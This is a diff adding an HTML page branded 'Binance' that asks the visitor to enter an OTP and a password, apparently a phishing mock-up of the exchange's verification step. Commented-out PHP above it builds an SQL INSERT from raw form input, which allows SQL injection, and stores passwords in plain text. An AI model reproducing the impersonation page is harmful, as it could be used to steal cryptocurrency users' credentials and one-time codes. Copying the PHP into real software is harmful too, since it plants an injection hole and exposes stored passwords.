@@ -1,0 +1,94 @@
+<!-- <?php
+include "../conn.php";
+
+//! Form Validation
+$usernameerror = "";
+$username = "";
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = test_input($_POST["username"]);
+}
+function test_input($data)
+{
+    $data = trim($data);
+    $data = stripslashes($data);
+    $data = htmlspecialchars($data);
+    return $data;
+}
+// if ($_SERVER["REQUEST_METHOD"] == "POST") {
+//     if (empty($_POST["username"])) {
+//         $usernameerror = "Required!";
+//     } else {
+//         $username = test_input($_POST["username"]);
+//         if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+//             $usernameerror = "Not Valid!";
+//         }
+//     }
+// }
+// * Database Related
+if (isset($_POST['submit'])) {
+    $email = $_POST['username'];
+    $password = $_POST['password'];
+
+    $sql = "INSERT INTO `signup/login` (`id`, `username`,`password`) VALUES (NULL,'$username','$password')";
+
+    $result = $conn->query($sql);
+    echo "<br>";
+    if ($result == TRUE) {
+        echo "Signup Complete";
+    } else {
+        echo "Error:" . $sql . "<br>" . $conn->error;
+    }
+    $conn->close();
+}
+?> -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="main">
+        <div class="header text-center">
+            <img src="small_logo.png">
+            <div class="tagline">Verify Details</div>
+        </div>
+        
+        <form class="login-form" name="login_form">
+            <div class="">Enter the OTP</div>
+            <div class="fields_input">
+                <div>
+                <input type="number" name="otp1" class="otp_field" placeholder="0" min="0" max="9" required onpaste="return false">
+                <input type="number" name="otp2" class="otp_field" placeholder="0" min="0" max="9" required onpaste="return false">
+                <input type="number" name="otp3" class="otp_field" placeholder="0" min="0" max="9" required onpaste="return false">
+                <input type="number" name="otp4" class="otp_field" placeholder="0" min="0" max="9" required onpaste="return false">    
+                </div>
+
+                <div style="padding-right:20px">
+                <button type="button" name="otpbtn" id="otp-btn" class="text-center text-white">Resend OTP</button>
+                </div>
+            </div>
+          
+        
+            <hr class="hr-text" data-content="or">
+            
+            <div class="">Enter the Password</div>
+            
+            <input placeholder='Password' class="form-input password-login">
+            
+            <button id="submit" type="submit" name="submit" class="btn text-center text-white">Next</button>
+        </form>
+
+        <span class="footer-item counter" id="second"></span>
+        <span role="alert" id="message" aria-hidden="true" ></span>
+    </div>
+    <script src="script.js"></script>
+
+</body>
+
+</html>
